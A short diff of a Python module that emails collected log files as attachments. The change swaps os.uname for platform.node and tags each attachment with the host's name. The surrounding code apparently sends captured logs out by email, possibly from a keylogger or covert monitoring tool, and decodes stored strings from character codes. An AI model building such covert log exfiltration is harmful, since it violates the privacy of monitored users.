@@ -6,7 +6,7 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
 from time import strftime
-from os import uname
+from platform import node
 from constants import Constants
 from json import load, dump
 from time import time
@@ -20,7 +20,7 @@ def send(logger, day=1):
     del(files)
 
     parser = lambda data:"".join([chr(i) for i in data])
-    name = uname()[1]
+    name = node()
 
     with open(meta, "r") as f:
         j = load(f)["sender"]
@@ -57,7 +57,7 @@ def send(logger, day=1):
         part = MIMEBase('application', "octet-stream")
         part.set_payload(attachment)
         encoders.encode_base64(part)
-        part.add_header('Content-Disposition', "attachment; filename= logs")
+        part.add_header('Content-Disposition', f"attachment; filename= logs_{name}")
         msg.attach(part)
 
 
